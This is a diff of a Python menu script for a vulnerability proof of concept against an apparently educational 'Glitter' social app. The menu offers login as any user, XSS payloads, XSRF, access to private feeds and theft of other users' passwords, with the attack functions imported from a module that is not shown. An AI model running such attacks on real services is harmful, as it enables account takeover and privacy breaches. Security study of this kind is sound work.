@@ -1,16 +1,22 @@
 import glitter
 
+username = None
+password = None
+target_user_id = None
 
 def print_menu():
     """
     a function to print the vulnerabilities menu to the user
     :return: none
     """
-    print("GLITTER APP AND WEBSITE VULNERABILITY POC\n1. Login into any user (app only)\n2. Send Multiple Likes from Same User\n3. Send glit with different profile image\n4. Send Like with Fake Username\n5. Send Glit with Past Date\n6. Access Other User's Feed\n7. Send to Private Account\n8. Send Glit with Colored Font\n9. Send XSS Image Payload\n10. Send XSS Link Payload\n11. Send Comment with Fake Name\n12. Send Multiple Wows from Same User\n13. XSRF, send a message to yourself from any user that you want\n14. PRIVACY - get private information of other users\n15. post a video to other user's feed\n0. Exit")
+    print("GLITTER APP AND WEBSITE VULNERABILITY POC\n1. Login into any user (app only)\n2. Send Multiple Likes from Same User\n3. Send glit with different profile image\n4. Send Like with Fake Username\n5. Send Glit with Past Date\n6. Access Other User's Feed\n7. Send to Private Account\n8. Send Glit with Colored Font\n9. Send XSS Image Payload\n10. Send XSS Link Payload\n11. Send Comment with Fake Name\n12. Send Multiple Wows from Same User\n13. XSRF, send a message to yourself from any user that you want\n14. post a video to other user's feed\n15. PASSWORD, get other user's password\n0. Exit")
 
 
 def main():
     while True:
+        global username
+        global password
+        global target_user_id
         username = input("Enter your username: ")
         password = input("Enter your password: ")
         print_menu()
@@ -40,10 +46,10 @@ def main():
                 glitter.send_glit_from_past()
             elif choice == "6":
                 target_user_id = input("Enter the target's user_id you want to see it's feed (for example: 22779): ")
-                glitter.access_other_user_feed(target_user_id)
+                glitter.access_other_user_feed()
             elif choice == "7":
                 target_user_id = input("Enter the target's user_id you want to send a glit to (for example: 22779): ")
-                glitter.send_to_private_account(target_user_id)
+                glitter.send_to_private_account()
             elif choice == "8":
                 color = input("Enter the color you want the text to be (for example: white, blue, purple): ")
                 glitter.send_colored_font_glit(color)
@@ -59,6 +65,15 @@ def main():
                 glit_id = input("Enter the glit_id of the glit you would send a wow on it(for example: 81199): ")
                 count = int(input("Enter the amount of wows you would like to do: "))
                 glitter.send_multiple_wows(glit_id, count)
+        elif choice in range (12, 16):
+            glitter.login_website()
+            if choice == "13":
+                target_user_id = input("Enter the target's user_id you want to send a video to (for example: 22779): ")
+                glitter.xsrf_send_message_to_yourself_from_another_user()
+            elif choice == "14":
+                glitter.post_video_to_another_user_feed()
+            elif choice == "15":
+                glitter.get_password()
             if glitter.sock:
                 glitter.sock.close()
         else:
@@ -67,4 +82,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
